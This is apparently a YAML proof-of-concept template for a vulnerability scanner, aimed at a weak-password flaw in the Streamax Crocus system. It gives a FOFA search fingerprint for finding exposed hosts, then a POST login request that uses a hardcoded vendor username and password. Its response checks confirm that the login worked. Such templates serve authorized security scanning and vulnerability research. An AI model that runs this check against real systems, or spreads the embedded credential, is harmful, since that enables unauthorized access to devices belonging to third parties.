id: poc-yaml-crocus-weak-password
info:
  name: 锐明技术 Crocus系统 弱口令漏洞
  severity: medium
  tags:
  - 弱口令
  finger: crocus
  fofa: body="/ThirdResource/respond/respond.min.js" && title="Crocus"
requests:
- method: POST
  path: /RegisterLogin.do?Action=Login
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: UserName=streamax20020818&Password=20020818streamax&MailCode=&AuthCode=
  expression: "status_code == 200 && \ncontains(body,\"\\\"Result\\\":true\") &&\n\
    contains(body,\"ReviceAccount\") &&\ncontains(headers,\"Saffron.U=\") &&\ncontains(content_type,\"\
    text/json;charset=UTF-8\")\n"
variables: {}
transport: http
